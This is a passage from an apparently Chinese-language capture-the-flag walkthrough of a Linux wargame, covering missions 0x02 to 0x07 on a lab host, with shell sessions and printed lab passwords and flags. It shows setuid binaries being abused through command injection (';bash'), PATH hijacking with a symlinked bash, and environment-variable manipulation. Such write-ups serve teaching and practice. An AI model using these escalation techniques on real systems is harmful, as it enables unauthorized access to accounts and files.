-rw-r--r-- <span class="token number">1</span> hacker hacker  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   hacker  <span class="token number">194</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rw-r----- <span class="token number">1</span> root   hacker <span class="token number">2625</span> Apr  <span class="token number">5</span> 06:36 readme.txt
acantha@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> acant* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/pwned/acantha
/pazz/acantha_pass.txt
acantha@hades:~$ <span class="token function">cat</span> /pazz/acantha_pass.txt 
mYYLhLBSkrzZqFydxGkn</code></pre>
<p>ssh登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">acantha@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span>
acantha@hades:~$ <span class="token function">ls</span> 
flagz.txt  guess  mission.txt
acantha@hades:~$ <span class="token function">cat</span> flagz.txt 
^CaEuVJtJjaCwZtuuAFD^</code></pre>
<h2 id="MISSION-0x02"><a href="#MISSION-0x02" class="headerlink" title="MISSION 0x02"></a>MISSION 0x02</h2><pre class="language-bash" data-language="bash"><code class="language-bash">acantha@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x02 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user alala has left us a program, <span class="token keyword">if</span> we insert the <span class="token number">6</span> correct numbers, she gives us her password<span class="token operator">!</span>

<span class="token comment">## ES ##</span>
La usuaria alala nos ha dejado un programa, si insertamos los <span class="token number">6</span> numeros correctos, nos da <span class="token function">su</span> password<span class="token operator">!</span></code></pre>
<p>反编译guess<br><img src="https://ooo.0x0.ooo/2024/06/24/OPFVtY.png" alt="OPFVtY.png" loading="lazy"><br>直接拿到密码<code>DsYzpJQrCEndEWIMxWxu</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root   alala   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> alala  alala   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> althea althea    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 althea_pass.txt
-rw-r----- <span class="token number">1</span> root   alala     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   alala    <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root   alala  <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">read</span>
alala@hades:~$ <span class="token function">cat</span> flagz.txt 
^gTdGmkwhDrCqKrDQpxH^</code></pre>
<h2 id="MISSION-0x03"><a href="#MISSION-0x03" class="headerlink" title="MISSION 0x03"></a>MISSION 0x03</h2><pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x03 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User althea loves reading Linux help.

<span class="token comment">## ES ##</span>
A la usuaria althea le encanta leer la ayuda de Linux.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root   alala   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> alala  alala   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> althea althea    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 althea_pass.txt
-rw-r----- <span class="token number">1</span> root   alala     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   alala    <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root   alala  <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">read</span></code></pre>
<p>直接在底端执行命令读取 althea的密码就行了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> althea* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/pwned/alala/althea_pass.txt</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/24/OPFY2v.png" alt="OPFY2v.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ ./read
ObxEmwisYjERrDfvSbdA
<span class="token operator">!</span>done  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span></code></pre>
<p>拿到密码<code>ObxEmwisYjERrDfvSbdA</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ <span class="token function">cat</span> flagz.txt 
^btDtPAPzSiXmoHItpqX^</code></pre>
<h2 id="MISSION-0x04"><a href="#MISSION-0x04" class="headerlink" title="MISSION 0x04"></a>MISSION 0x04</h2><pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x04 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user andromeda has left us a program to list directories.

<span class="token comment">## ES ##</span>
La usuaria andromeda nos ha dejado un programa para listar directorios.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ ./lsme
Enter <span class="token function">file</span> to check:
/pwned/andromeda
/bin/ls: cannot <span class="token function">open</span> directory <span class="token string">'/pwned/andromeda'</span><span class="token builtin class-name">:</span> Permission denied
Segmentation fault
althea@hades:~$ ./lsme
Enter <span class="token function">file</span> to check:
<span class="token punctuation">;</span><span class="token function">id</span>
total <span class="token number">28</span>
-r--r----- <span class="token number">1</span> andromeda andromeda    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 andromeda_pass.txt
-rw-r----- <span class="token number">1</span> root      althea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rwS--s--- <span class="token number">1</span> root      althea    <span class="token number">16216</span> Apr  <span class="token number">5</span> 06:36 lsme
-rw-r----- <span class="token number">1</span> root      althea      <span class="token number">205</span> Apr  <span class="token number">5</span> 06:36 mission.txt
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2045</span><span class="token punctuation">(</span>althea<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2045</span><span class="token punctuation">(</span>althea<span class="token punctuation">)</span></code></pre>
<p>测试发现可以命令执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ ./lsme
Enter <span class="token function">file</span> to check:

<span class="token punctuation">;</span><span class="token function">bash</span>
total <span class="token number">28</span>
-r--r----- <span class="token number">1</span> andromeda andromeda    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 andromeda_pass.txt
-rw-r----- <span class="token number">1</span> root      althea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rwS--s--- <span class="token number">1</span> root      althea    <span class="token number">16216</span> Apr  <span class="token number">5</span> 06:36 lsme
-rw-r----- <span class="token number">1</span> root      althea      <span class="token number">205</span> Apr  <span class="token number">5</span> 06:36 mission.txt
andromeda@hades:~$ <span class="token function">cat</span> andromeda_pass.txt 
OTWGTbHzrxhYFSTlKcOt</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root      andromeda  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root      root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> andromeda andromeda   <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> andromeda andromeda  <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> andromeda andromeda   <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> anthea    anthea       <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 anthea_pass.txt
-rw-r----- <span class="token number">1</span> root      andromeda    <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root      andromeda   <span class="token number">166</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root      andromeda <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 uid
andromeda@hades:~$ ca tfl
-bash: ca: <span class="token builtin class-name">command</span> not found
andromeda@hades:~$ <span class="token function">cat</span> flagz.txt 
^xzsHGrOeNctIZLGKzWq^</code></pre>
<h2 id="MISSION-0x05"><a href="#MISSION-0x05" class="headerlink" title="MISSION 0x05"></a>MISSION 0x05</h2><pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x05 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user anthea reminds us <span class="token function">who</span> we are.

<span class="token comment">## ES ##</span>
La usuaria anthea procura que no olvidemos quien somos.</code></pre>
<p>软连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /tmp/id
ln: failed to create symbolic <span class="token function">link</span> <span class="token string">'/tmp/id'</span><span class="token builtin class-name">:</span> File exists
andromeda@hades:~$ <span class="token function">rm</span> /tmp/id
andromeda@hades:~$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /tmp/id
andromeda@hades:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp
andromeda@hades:~$ ./uid
anthea@hades:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/bin
anthea@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span>
anthea@hades:~$ <span class="token function">cat</span> anthea_pass.txt
yWFLtSNQArEBTHtWgkKd</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root      anthea     <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root      root       <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> anthea    anthea      <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> anthea    anthea     <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> anthea    anthea      <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> aphrodite aphrodite    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 aphrodite_pass.txt
-rw-r----- <span class="token number">1</span> root      anthea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root      anthea      <span class="token number">175</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root      anthea    <span class="token number">16256</span> Apr  <span class="token number">5</span> 06:36 obsessed
anthea@hades:~$ <span class="token function">cat</span> flagz.txt 
^AcFLuAjhydNKIkPoFLL^</code></pre>
<h2 id="MISSION-0x06"><a href="#MISSION-0x06" class="headerlink" title="MISSION 0x06"></a>MISSION 0x06</h2><pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x06 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User aphrodite is obsessed with the number <span class="token number">94</span>. 

<span class="token comment">## ES ##</span>
La usuaria aphrodite esta obsesionada con el numero <span class="token number">94</span>.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">anthea@hades:~$ ./obsessed 
No MYID ENV
anthea@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MYID</span><span class="token operator">=</span><span class="token number">94</span>
anthea@hades:~$ ./obsessed 
Current MYID: <span class="token number">57</span>
Incorrect MYID
anthea@hades:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">MYID</span><span class="token operator">=</span>^
anthea@hades:~$ ./obsessed
Current MYID: <span class="token number">94</span>
aphrodite@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">(</span>aphrodite<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2047</span><span class="token punctuation">(</span>anthea<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">cat</span> aphrodite_pass.txt 
HPJVaqRzieKQeyyATsFv
aphrodite@hades:~$ <span class="token function">cat</span> flagz.txt 
^fmPlsDByrwmEpRAKgeP^</code></pre>
<h2 id="MISSION-0x07"><a href="#MISSION-0x07" class="headerlink" title="MISSION 0x07"></a>MISSION 0x07</h2><pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x07 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user ariadne knows what we keep <span class="token keyword">in</span> our <span class="token environment constant">HOME</span><span class="token builtin class-name">.</span>

<span class="token comment">## ES ##</span>
La usuaria ariadne sabe que es lo que guardamos en nuestro <span class="token environment constant">HOME</span><span class="token builtin class-name">.</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ ./homecontent 
The content of your <span class="token environment constant">HOME</span> is:
ariadne_pass.txt  flagz.txt  homecontent  mission.txt</code></pre>
<p>猜测执行ls+环境变量里面的home变量</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">aphrodite@hades:~$ <span class="token function">env</span>
<span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/bash
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/pwned/aphrodite
<span class="token assign-left variable"><span class="token environment constant">LOGNAME</span></span><span class="token operator">=</span>aphrodite
<span class="token assign-left variable">MOTD_SHOWN</span><span class="token operator">=</span>pam
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/pwned/aphrodite
<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
<span class="token assign-left variable"><span class="token environment constant">LS_COLORS</span></span><span class="token operator">=</span>rs<span class="token operator">=</span><span class="token number">0</span>:di<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">34</span>:ln<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">36</span>:mh<span class="token operator">=</span>00:pi<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span>:so<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:do<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:bd<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span><span class="token punctuation">;</span>01:cd<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">33</span><span class="token punctuation">;</span>01:or<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token number">31</span><span class="token punctuation">;</span>01:mi<span class="token operator">=</span>00:su<span class="token operator">=</span><span class="token number">37</span><span class="token punctuation">;</span><span class="token number">41</span>:sg<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token number">43</span>:ca<span class="token operator">=</span>00:tw<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token number">42</span>:ow<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span><span class="token number">42</span>:st<span class="token operator">=</span><span class="token number">37</span><span class="token punctuation">;</span><span class="token number">44</span>:ex<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">32</span>:*.tar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tgz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.arc<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.arj<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.taz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lha<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lz4<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzh<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzma<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tlz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.txz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tzo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.t7z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zip<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.dz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.gz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lrz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.lzo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.xz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zst<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tzst<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.bz2<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.bz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tbz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tbz2<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.tz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.deb<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rpm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.jar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.war<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.ear<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.sar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rar<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.alz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.ace<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.zoo<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.cpio<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.7z<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.rz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.cab<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.wim<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.swm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.dwm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.esd<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">31</span>:*.avif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.jpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.jpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mjpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mjpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.gif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.bmp<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pbm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pgm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ppm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tga<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xbm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xpm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tif<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.tiff<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.png<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.svg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.svgz<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mng<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.pcx<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mov<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mpg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mpeg<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.m2v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mkv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.webm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.webp<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mp4<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.m4v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.mp4v<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.vob<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.qt<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.nuv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.wmv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.asf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.rm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.rmvb<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.flc<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.avi<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.fli<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.flv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.gl<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.dl<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xcf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.xwd<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.yuv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.cgm<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.emf<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogv<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.ogx<span class="token operator">=</span>01<span class="token punctuation">;</span><span class="token number">35</span>:*.aac<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.au<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.flac<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.m4a<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mid<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.midi<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mka<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mp3<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.mpc<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.ogg<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.ra<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.wav<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.oga<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.opus<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.spx<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*.xspf<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">36</span>:*~<span class="token operator">=</span>00<span class="token punctuation">;</span><span class="token number">90</span>:*<span class="token comment">#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:</span>
<span class="token assign-left variable">SSH_CONNECTION</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token number">38114</span> <span class="token number">127.0</span>.0.1 <span class="token number">22</span>
<span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm-256color
<span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>aphrodite
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable">SSH_CLIENT</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token number">38114</span> <span class="token number">22</span>
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
